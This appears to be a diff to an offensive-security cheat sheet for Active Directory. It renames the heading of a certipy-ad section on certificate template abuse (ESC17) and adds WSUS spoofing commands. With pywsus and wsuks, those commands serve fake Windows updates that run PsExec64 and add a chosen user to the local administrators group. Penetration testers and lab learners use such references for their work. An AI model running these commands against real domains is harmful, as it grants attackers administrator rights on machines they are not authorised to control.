@@ -5253,7 +5253,7 @@ certipy-ad req -u '<USERNAME>' -p '<PASSWORD>' -dc-ip <RHOST> -ca '<CA>' -templa
 certipy-ad auth -pfx 'Administrator.pfx' -dc-ip <RHOST>
 ```
 
-### ESC17: Server Authentication Template Abuse
+###### ESC17: Server Authentication Template Abuse
 
 ```shell
 certipy-ad find -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -vulnerable -stdout
@@ -5289,8 +5289,20 @@ bloodyAD -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' --host <RHOST> --dc-ip <RHO
 nslookup <RHOST> <RHOST>
 ```
 
-```shell
+```console
+python3 pywsus.py -H <RHOST> -p 8531 -e PsExec64.exe -c '-accepteula -s cmd.exe /c net localgroup administrators <USERNAME> /add' --cert <FILE>.crt --key <FILE>.key
+```
+
+or
+
+```console
 sudo wsuks -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' --dc-ip <RHOST> -t <RHOST> --WSUS-Server <RHOST> --tls-cert <FILE>.pem
+```
+
+or
+
+```console
+sudo wsuks --serve-only --tls-cert <FILE>.pem -e PsExec64.exe -c '-accepteula -s cmd.exe /c net localgroup administrators <USERNAME> /add' -I <INTERFACE>
 ```
 
 ```shell
